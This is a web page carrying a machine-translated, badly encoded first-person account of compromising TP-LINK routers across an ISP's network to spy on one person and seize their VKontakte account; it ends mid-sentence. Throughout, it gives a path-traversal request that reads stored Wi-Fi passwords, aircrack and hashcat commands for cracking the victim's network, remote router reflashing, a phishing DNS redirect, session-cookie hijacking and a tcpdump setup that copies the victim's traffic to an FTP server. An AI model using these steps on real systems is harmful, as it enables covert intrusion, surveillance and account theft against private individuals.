<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§† üï∫üèø üõÄüèº Qu√© vulnerabilidades en los enrutadores TP-LINK pueden provocar ü§Ωüèø üî¢ üß§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="De hecho, este art√≠culo discutir√° no solo las vulnerabilidades en los enrutadores TP-LINK, sino tambi√©n c√≥mo hacer remotamente una estaci√≥n de pirateo...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Qu√© vulnerabilidades en los enrutadores TP-LINK pueden provocar</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/381573/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">De hecho, este art√≠culo discutir√° no solo las vulnerabilidades en los enrutadores TP-LINK, sino tambi√©n c√≥mo hacer remotamente una estaci√≥n de pirateo desde dichos enrutadores y qu√© se puede lograr con esto. </font><font style="vertical-align: inherit;">Y tambi√©n un poco sobre c√≥mo se aplic√≥ para obtener acceso a la p√°gina VKontakte. </font><font style="vertical-align: inherit;">Esta es una especie de historia de un gran truco, que incluye todo lo anterior.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Me tom√≥ una vez obtener acceso a la p√°gina VK de una persona, mientras era lo m√°s invisible posible para el usuario, y comenc√© a buscar formas. Lo primero que se me ocurri√≥ fue dejar caer el troyano a la v√≠ctima, porque ya hab√≠a preparado un TightVNC oculto con una conexi√≥n posterior para mi reproductor IP + VLC oculto, que tambi√©n transmite el sonido del micr√≥fono en tiempo real a mi IP. Sin embargo, no se defini√≥ en absoluto como malware en VirusTotal. Pero el art√≠culo no trata sobre eso en absoluto. Como resultado, logr√© robar el troyano, as√≠ como obtener acceso al VK (simplemente copiando las cookies del navegador de la v√≠ctima), pero pronto el sistema operativo se reinstal√≥ en la computadora del usuario y tuve que buscar otra forma.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lo √∫nico que sab√≠a era qu√© proveedor ten√≠a la v√≠ctima. Bueno, comenc√© escaneando todo el rango de este notorio proveedor de la ciudad N (por razones obvias, no llamar√© al proveedor), y encontr√© algo maravilloso: el puerto 8080 est√° abierto en la mayor√≠a de los hosts. De inmediato se hizo evidente que esta es una interfaz web enrutador Ya esperaba el administrador predeterminado (entonces habr√≠a sido un colapso completo para el proveedor), pero no, no pude encontrar la contrase√±a, aunque todav√≠a encontr√© una docena de enrutadores donde estaba la contrase√±a predeterminada. Result√≥ que el 90% de todos los enrutadores son TP-Link TL-WR741ND y con menos frecuencia 740N, 841N, 941ND.</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/geektimes/post_images/256/603/b26/256603b26f76e009b2a3bf2bae2abea9.jpg" alt="imagen"><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqu√≠ todo est√° muy claro: el proveedor alquila los mismos enrutadores a los usuarios, los configura durante la instalaci√≥n y es demasiado flojo para que los usuarios cambien esta configuraci√≥n. Se volvi√≥ m√°s y m√°s interesante. Seguramente en este caso deber√≠a haber alg√∫n patr√≥n en la configuraci√≥n, es decir, las contrase√±as son probablemente las mismas. Decid√≠ buscar en Google si hab√≠a alguna vulnerabilidad en estos modelos y, para mi sorpresa en ese momento, encontr√© muchas de ellas. Lo primero que me llam√≥ la atenci√≥n fue el art√≠culo </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"Puerta trasera en enrutadores TP-LINK"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Inmediatamente decid√≠ verificar esta vulnerabilidad. Los archivos se cargaron en el enrutador, pero √©l no los acept√≥, y luego comenc√© a pensar en qu√© se trata este nart.out. Este es un binario MIPS, que en esencia puede ser cualquier aplicaci√≥n, solo necesita construirlo. Para empezar, comenc√© a buscar una versi√≥n preparada, porque antes, casi nunca tuve que lidiar con la compilaci√≥n cruzada. Para mi sorpresa, justo en ese momento otra persona estaba interesada en este tema: </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specx2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (por cierto, recomiendo leer su </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">art√≠culo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sobre c√≥mo ensamblar una estaci√≥n de pirateo desde un enrutador, lo que, de hecho, lo hice al final, solo de forma remota). Se las arregl√≥ para encontrar netcat compilado bajo MIPS en uno de los foros chinos, por cierto, exactamente en la secci√≥n donde se discuti√≥ esta vulnerabilidad. Este binario se lanz√≥ con √©xito bajo QEMU, se verti√≥ con √©xito en el enrutador a trav√©s de la puerta trasera encontrada, pero, por alguna raz√≥n, no fue posible conectarse al enrutador: simplemente no ten√≠a una conexi√≥n. El camarada Specx2 </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sugiri√≥</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> que el punto puede ser que el puerto 2222 simplemente est√© cerrado, y que de alguna manera debe hacer que netcat se ejecute en otro puerto.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Intentamos compilar netcat para MIPS nosotros mismos, pero no pudimos establecer la opci√≥n de puerto predeterminada. Luego, usamos un desensamblador, pero igual de infructuoso. Y luego decid√≠ abrir este binario con el Notepad ++ habitual y, para mi sorpresa, encontr√© el codiciado 2222. Este n√∫mero podr√≠a cambiarse f√°cilmente a cualquier otro, lo principal es que el n√∫mero de caracteres en el archivo no cambia. El puerto realmente cambi√≥, todo fue probado en QEMU, pero a√∫n no pudimos hacerlo funcionar en el enrutador. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No abandon√© mis intentos de obtener el control del enrutador y comenc√© a buscar otras vulnerabilidades. Pronto me encontr√© con </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">esta publicaci√≥n</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Y de hecho: en los modelos 841 y 941 hab√≠a una carcasa en</font></font><br>
<pre><code class="bash hljs">/userRpmNatDebugRpm26525557/linux_cmdline.html
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Solo aqu√≠ la contrase√±a del enrutador a√∫n necesitaba ser conocida, y los usuarios de este proveedor b√°sicamente ten√≠an 741 modelos. Logr√© encontrar un enrutador con una contrase√±a predeterminada y este shell, aunque muy truncado. Por lo tanto, obtuve acceso al sistema de archivos del enrutador. Desafortunadamente, no pude encontrar nada de valor, y el shell no funcion√≥ correctamente. ¬øRealmente los desarrolladores est√°n depurando a trav√©s de √©l? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parec√≠a un callej√≥n sin salida, durante mucho tiempo no tuve una sola pista, pero algo me dijo que todav√≠a hab√≠a vulnerabilidades. Y luego descubr√≠ que el enrutador no filtra las solicitudes GET. Es decir, de manera predeterminada, cuando la contrase√±a se ingresa incorrectamente, se abre la p√°gina / help, pero si, por ejemplo, hacemos esta solicitud:</font></font><br>
<pre><code class="bash hljs">GET IP:port/<span class="hljs-built_in">help</span>/../../
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Luego llegaremos a la ra√≠z del sistema de archivos del enrutador. Por lo tanto, podemos descargar casi cualquier archivo del enrutador FS sin siquiera saber la contrase√±a. Esta result√≥ ser la primera vulnerabilidad que funciona con √©xito de todo lo que encontr√©. Pero, ¬øqu√© nos da si solo podemos descargar archivos y no sabemos d√≥nde se almacena la contrase√±a? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Despu√©s de una breve b√∫squeda, a√∫n pude encontrar un archivo interesante en /tmp/ath0.ap_bss, que almacena la contrase√±a para Wi-Fi en forma clara. Inmediatamente decid√≠ verificarlo en uno de los enrutadores de los usuarios de este proveedor.</font></font><br>
<pre><code class="bash hljs">GET IP:8080/<span class="hljs-built_in">help</span>/../../tmp/ath0.ap_bss
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al final result√≥ que, la gente trabaja all√≠ bastante flojo, y pone las mismas contrase√±as en la interfaz web del enrutador y Wi-Fi, de modo que, habiendo aprendido la contrase√±a de Wi-Fi con esta vulnerabilidad, reconoceremos autom√°ticamente la contrase√±a de la interfaz web. Esto suele ser de 8 d√≠gitos. Menos com√∫nmente, n√∫meros con letras. Nuevamente, 8. De ahora en adelante, podr√≠a acceder al enrutador de casi cualquier usuario que no haya cambiado la contrase√±a establecida por el proveedor, y pr√°cticamente nadie la cambi√≥. Es cierto que algunos enrutadores todav√≠a ten√≠an la √∫ltima versi√≥n de firmware, y esta vulnerabilidad no funcionaba, pero no hab√≠a tantos. Inmediatamente descubr√≠ otro punto interesante. El SSID de todos los puntos conten√≠a la segunda mitad de la direcci√≥n IP interna del usuario, y el primero era el mismo para todos. Result√≥ lo mismo que en la cuenta personal en el sitio, la contrase√±a era la misma.Y esta segunda mitad de la IP interna fue el n√∫mero de contrato. Es decir, por el n√∫mero del acuerdo de usuario, fue posible calcular la IP interna.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A pesar de que todos los usuarios ten√≠an una IP externa real (aunque din√°mica), decid√≠ crear un servidor VPN en varios de los enrutadores de ASUS, donde hab√≠a una contrase√±a predeterminada. Afortunadamente, esta caracter√≠stica se cose en el firmware predeterminado. Por lo tanto, obtuve acceso a la red interna del proveedor.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pero antes de piratear el VK todav√≠a estaba lejos. Ni siquiera conoc√≠a a la v√≠ctima de IP. Ni externo ni interno. Hay muchas formas de averiguar la IP externa, y lo hice. Bueno, empecemos a estudiar. En primer lugar, respondi√≥ a las solicitudes de ping, que ya es bueno. En segundo lugar, sab√≠a que la v√≠ctima tambi√©n ten√≠a un enrutador (esto tambi√©n puede ser entendido por TTL, ya que la gran mayor√≠a de los usuarios tienen Windows, y el TTL predeterminado de Windows es 128), con el mismo modelo seguro. Pero, para mi profundo pesar, todos los puertos de la v√≠ctima estaban cerrados y no hab√≠a acceso al webmord desde el exterior. Pero sab√≠a que en cualquier caso es a trav√©s de LAN, pero para esto necesitamos conectarnos a este enrutador a trav√©s de una interfaz inal√°mbrica, as√≠ como recoger la contrase√±a para el panel de administraci√≥n, lo cual ser√≠a muy problem√°tico, porque no pude encontrarlo en ese momento donde se almacena Aunque ahora ya seen qu√© se almacena</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ dev / mtdblock3</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , pero este bloque no est√° montado, por lo que es imposible leerlo a trav√©s de la vulnerabilidad descrita. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tambi√©n aprend√≠ que el inicio de sesi√≥n desde la conexi√≥n VPN para acceder a Internet son las iniciales y el apellido del usuario o parte de √©l, y la contrase√±a es la misma. Empec√© a pensar, ¬øc√≥mo puedo encontrar el usuario que necesito? ¬øTal vez a√∫n comet√≠ el error de definir la IP esa vez, y ya logr√≥ cambiar mientras intentaba conectarme con el webmord? Lo primero que me vino a la mente fue una simple enumeraci√≥n de todos los enrutadores. Pero el n√∫mero de suscriptores en el proveedor es bastante grande. Despu√©s de escanear todo el rango, encontr√© unos 3.000 enrutadores con acceso remoto a la interfaz web. Y era necesario encontrar entre ellos el correcto, si lo hubiera.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primero, intent√© escribir un script que reconociera la contrase√±a utilizando la vulnerabilidad encontrada, y luego descargar√≠a la p√°gina de configuraci√≥n de la red y la guardar√≠a. Pero en esto soy d√©bil y, despu√©s de haber descartado esta idea por un tiempo, decid√≠ usar un clicker regular. Con la pena a la mitad, yo (o m√°s bien, el clicker) proces√© todo el rango. Luego, busqu√© en los archivos de configuraci√≥n (con la esperanza de encontrar a la v√≠ctima por apellido en el inicio de sesi√≥n desde la conexi√≥n vpn), pero no encontr√© nada que necesitara.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comenc√© a cavar m√°s y descubr√≠ que cualquier enrutador pirateado puede escanear los puntos de acceso que lo rodean a trav√©s de una interfaz basada en la web. Por lo tanto, tuve una idea loca: descifrar al vecino de la v√≠ctima con esta vulnerabilidad, de modo que con su enrutador pudiera intentar descifrar la contrase√±a de Wi-Fi de la v√≠ctima e ingresar a la interfaz web a trav√©s de la LAN, siempre que viaje un par de miles de kil√≥metros sin confianza en el √©xito no era razonable, y simplemente no hab√≠a posibilidad. Pero implementar lo que se concibi√≥ en ese momento parec√≠a impensable. ¬øC√≥mo encontrar un vecino?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Recuerde que la segunda parte de la IP interna est√° contenida en el SSID. Coincide con el n√∫mero de contrato. Ser√≠a bueno saber el SSID del punto de acceso del usuario para que pueda encontrarlo. ¬øQu√© he hecho? S√≠, lo acabo de tomar y escrib√≠ al soporte t√©cnico del proveedor, present√°ndome como usuario, supuestamente quiero pagar por Internet, pero olvid√© el n√∫mero de contrato. Y al instante recib√≠ una respuesta, ya que sab√≠a el nombre y la direcci√≥n. Por lo tanto, reconoc√≠ la IP interna de la v√≠ctima, que por cierto es est√°tica (por lo que no tiene sentido calcular constantemente la din√°mica externa, porque hay acceso a la red interna a trav√©s de VPN en uno de los enrutadores pirateados). Tambi√©n obtuve el SSID estimado de este usuario, as√≠ que ya ten√≠a algo con qu√© trabajar.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La tarea consist√≠a en entrar en todos los enrutadores en una fila y uno de ellos para encontrar un enrutador con el codiciado SSID en el distrito. La tarea nuevamente no fue f√°cil, pero recuerde que tenemos acceso a su cuenta personal, donde se indica la direcci√≥n de la residencia del usuario. Despu√©s de realizar varios experimentos, me di cuenta de que hay un cierto patr√≥n entre la IP interna y la direcci√≥n del usuario. Es decir, no es necesario que los vecinos est√©n en la misma subred, sino al menos en los vecinos, por ejemplo: 10.168.155.0 y 10.168.158.0. Entonces, al encontrar al usuario que vive cerca de la v√≠ctima por el m√©todo de b√∫squeda cient√≠fica, comenc√© a clasificar todos los enrutadores en las subredes vecinas. Como resultado, no encontr√© el codiciado SSID, pero encontr√© 2 vecinos despu√©s de ver su direcci√≥n en mi cuenta. Me explot√≥ la cabeza: c√≥mo podr√≠a ser, encontr√© vecinos, pero no tengo el punto de acceso correcto cerca. Sin embargo, ella estaba, solo con un SSID cambiado,y adivin√© cu√°l. Result√≥ ser f√°cil.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
¬°Multa! Se encontr√≥ que el enrutador, como sus vecinos, hab√≠a pasado mucho tiempo en esto. ¬øQu√© sigue? Necesitamos obtener de alguna manera la contrase√±a de la red inal√°mbrica, pero para esto necesitamos interceptar el protocolo de enlace y recoger la contrase√±a (la protecci√≥n es WPA2-PSK), o recoger el PIN de WPS, porque WPS est√° habilitado de forma predeterminada, pero en la mayor√≠a de los enrutadores bloqueado despu√©s de 10 intentos inv√°lidos. ¬øC√≥mo implementamos al menos algo de esto? De hecho, en los enrutadores de los vecinos no hay software especializado. Y luego se pens√≥ en actualizar sus enrutadores OpenWRT, porque este firmware es el m√°s cercano a Linux real, y tambi√©n hay paquetes de aircrack-ng, reaver y muchos otros para √©l. Camarada </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specx2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">incluso Bully se reuni√≥ debajo de √©l. Solo hab√≠a un problema: ¬øc√≥mo volver a instalar el enrutador de forma remota y no perder el acceso? Despu√©s de todo, despu√©s de parpadear, todas las configuraciones se restablecen a sus valores predeterminados. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estuve atormentado con este problema durante mucho tiempo, pens√© que era necesario recopilar todo el firmware desde cero desde la fuente y de alguna manera precontrolar la configuraci√≥n all√≠, pero todo result√≥ ser mucho m√°s simple. Ni siquiera sab√≠a sobre la existencia de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpenWRT Image Builder</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Lo descubr√≠ bastante r√°pido, pero tuve que elegir el conjunto correcto de paquetes, porque el volumen del firmware no puede superar los 4 MB, y esto es peque√±o, dado que muchos arrastran una gran lista de dependencias. </font><font style="vertical-align: inherit;">El siguiente problema fue que el usuario obtuvo acceso a Internet solo despu√©s de establecer una conexi√≥n VPN con el servidor del proveedor, pero luego todo el tr√°fico entr√≥ en el t√∫nel y perd√≠ el contacto con el enrutador. </font><font style="vertical-align: inherit;">Entonces, que mi vecino me perdone, lo dej√© sin Internet. </font><font style="vertical-align: inherit;">Despu√©s de flashear con √©xito su enrutador (despu√©s de dejar a un par de docenas de usuarios sin Internet en el transcurso de experimentos fallidos), inmediatamente transfer√≠ la tarjeta de red del enrutador al </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">modo monitor</font></font></b><br>
<pre><code class="bash hljs">ifconfig wlan0 down<font></font>
iw reg <span class="hljs-built_in">set</span> BO<font></font>
iwconfig wlan0 txpower 27<font></font>
airmon-ng start wlan0<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y lanz√≥ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">airodump-ng</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<pre><code class="bash hljs">airodump-ng mon0 ‚Äìc _ ‚Äìbssid MAC__ ‚Äìw /tmp/123
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Interceptar un apret√≥n de manos no fue dif√≠cil. </font><font style="vertical-align: inherit;">Inmediatamente descargu√© el volcado del enrutador usando </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SCP</font></font></b><br>
<pre><code class="bash hljs">scp ‚ÄìP port user@host:/tmp/123-01.cap ~/123.cap
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lo filtr√≥ de paquetes innecesarios en Wireshark:</font></font><br>
<pre><code class="bash hljs">wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x04 || eapol
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">convertido</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> al formato .hccap para Hashcat. </font><font style="vertical-align: inherit;">Prepar√© un peque√±o diccionario de antemano, lo que me ayud√≥ a descifrar muchas redes inal√°mbricas, y tambi√©n agregu√© todas las contrase√±as posibles que podr√≠a usar este usuario.</font></font><br>
<pre><code class="bash hljs">oclHashcat64.exe ‚Äìm2500 ‚Äìa0 123.hccap wordlist.txt
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Afortunadamente, despu√©s de un par de segundos se encontr√≥ la contrase√±a. </font><font style="vertical-align: inherit;">¬°Pero a√∫n ten√≠a que conectarse de alguna manera al enrutador en modo cliente! </font><font style="vertical-align: inherit;">Solo entonces la WAN para el enrutador del vecino volver√° a cambiar y perder√© el acceso. </font><font style="vertical-align: inherit;">Todav√≠a no pod√≠a entender c√≥mo resolver este problema, as√≠ que tuve que pedirle a una persona que hiciera un sacrificio, que iniciara sesi√≥n desde el tel√©fono y abriera el acceso remoto (ahora puedo suponer que solo ten√≠a que agregar rutas est√°ticas al firmware por adelantado). </font><font style="vertical-align: inherit;">Afortunadamente, la contrase√±a de la interfaz web result√≥ ser admin admin predeterminada.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
¬°Todo sali√≥ bien! Ya he preparado un nuevo plan de acci√≥n. En mi IP real sin filtro, levant√© el servidor DNS, donde cambi√© la entrada para vk.com y la cambi√© a mi IP, donde tambi√©n se levant√≥ el servidor HTTP con PHP. All√≠, en consecuencia, se complet√≥ la falsificaci√≥n con la p√°gina de autorizaci√≥n de vk.com, y en el enrutador el servidor DNS se cambi√≥ por el m√≠o. Un usuario, que inici√≥ sesi√≥n en vk.com, descubri√≥ mi falso, y por lo tanto la contrase√±a era m√≠a, ¬°el objetivo se logr√≥!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Durante mucho tiempo utilic√© este m√©todo para obtener una contrase√±a, pero una vez que se activ√≥ la confirmaci√≥n de inicio de sesi√≥n en vk.com, que, seg√∫n los propios creadores, es casi imposible de sortear. La conclusi√≥n es que al autorizar desde un nuevo dispositivo / navegador, si ingresa la contrase√±a correcta, tambi√©n debe ingresar el c√≥digo de SMS, que se env√≠a al n√∫mero del propietario. Pero para este caso, hace tiempo que he preparado una teor√≠a que a√∫n no se ha probado.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En primer lugar, trat√© de entender c√≥mo el servidor determina que la entrada proviene de un nuevo dispositivo. Todo result√≥ ser bastante simple: se agrega una nueva Cookie al navegador (si mi memoria me sirve, se llama remixttpid), que se transmite solo a trav√©s de una conexi√≥n cifrada. Y por ello, el servidor ya determina el navegador desde el cual se permite el inicio de sesi√≥n. Si no me equivoco, el User-Agent tambi√©n debe coincidir. Por lo tanto, es suficiente para que interceptemos esta cookie para iniciar sesi√≥n con √©xito con una contrase√±a conocida, pero es bastante dif√≠cil hacer esto: necesitamos pasar el tr√°fico del usuario a trav√©s de mitmproxy, para que tambi√©n inicie sesi√≥n en ese momento. Adem√°s, el usuario notar√° una advertencia en el navegador sobre la falta de coincidencia de un certificado. ¬øPor qu√© estar tan pervertido, pens√©?si puedes interceptar una sesi√≥n existente? Despu√©s de todo, la verificaci√≥n del navegador se realiza solo en el momento del inicio de sesi√≥n, ¬°pero no se realiza para ninguna solicitud de una sesi√≥n existente! Por lo tanto, solo necesitamos interceptar</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , que, adem√°s, se transmite a trav√©s de una conexi√≥n insegura, porque el usuario no usa https. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El problema era solo ese </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">coincide con la IP del usuario, y si cambia, tambi√©n se utilizan cookies para login.vk.com, que se transmiten solo a trav√©s de una conexi√≥n encriptada, y es m√°s dif√≠cil interceptarlas. Pero tuve suerte. En ese momento, el proveedor comenz√≥ a proporcionar acceso a Internet sin la necesidad de establecer una conexi√≥n VPN, lo que significa que podr√≠a simplemente levantar mi servidor PPTP y configurar una conexi√≥n a √©l en la configuraci√≥n del enrutador del usuario. As√≠ lo hice, todo el tr√°fico me atraves√≥ y el usuario, sin saberlo, cre√≥ una sesi√≥n adjunta a mi IP, que fue interceptada sin ning√∫n problema. A continuaci√≥n, acabo de devolver la configuraci√≥n anterior y uso la sesi√≥n interceptada (el beneficio de IP es est√°tico). ¬°Protecci√≥n de SMS rota con √©xito!</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todo estar√≠a bien, pero no me detuve all√≠. El hecho es que si el usuario comprende de repente cu√°l es el problema, simplemente puede cambiar la contrase√±a desde la configuraci√≥n del enrutador y desde Wi-Fi. Para evitar esto, comenc√© a construir OpenWRT bajo un enrutador de usuario. Era necesario prever todo. Para un monitoreo conveniente del tr√°fico de v√≠ctimas, mont√© el servidor FTP como un sistema de archivos usando curlftpfs. Los vertederos est√°n escritos all√≠. Todo este proceso se describe en este </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">art√≠culo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Inicialmente, </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">plane√©</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> montar la nube como un sistema de archivos, para lo cual utilic√© </font><b><font style="vertical-align: inherit;">davfs2</font></b><font style="vertical-align: inherit;"> , que tampoco fue f√°cil </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">de construir con OpenWRT</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, pero el problema era que el archivo se escribi√≥ primero en la memoria cach√© y solo luego se verti√≥ en la nube. </font><font style="vertical-align: inherit;">En consecuencia, el tama√±o del archivo estaba limitado por el tama√±o del cach√©, que es extremadamente peque√±o. </font><font style="vertical-align: inherit;">Entonces eleg√≠ curlftpfs. </font><font style="vertical-align: inherit;">El tr√°fico se registr√≥ con tcpdump y se dividi√≥ en archivos de 512 MB.</font></font><br>
<pre><code class="bash hljs">tcpdump -i br-lan -w /root/ftp/dump/`date +<span class="hljs-string">"%d_%m_%Y_%T_"</span>` -C 512Mb &amp;
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Donde / root / ftp / dump es nuestro sistema de archivos ftp. </font><font style="vertical-align: inherit;">Todo este negocio se puede poner en inicio autom√°tico (/etc/rc.local). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En general, el conjunto final de paquetes para el firmware OpenWRT Attitude Adjustment 12.09 se ve√≠a as√≠:</font></font><br>
<pre><code class="bash hljs">make image PROFILE=TLWR740 PACKAGES=<span class="hljs-string">"curlftpfs tcpdump tinyproxy wireless-tools -ppp -ppp-mod-pppoe"</span> FILES=files/
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Curlftpfs ocupa la mayor parte de la memoria, pero nos da una cantidad ilimitada por ftp. </font><font style="vertical-align: inherit;">Tcpdump hace posible registrar el tr√°fico de la v√≠ctima durante todo el d√≠a, y tinyproxy permite el acceso a Internet desde la IP de la v√≠ctima, es decir, al interceptar </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">remixsid,</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> por ejemplo, tambi√©n podemos ingresar el VK del usuario desde su IP usando tinyproxy, o simplemente podemos redirigir su tr√°fico a su proxy de esta manera:</font></font><br>
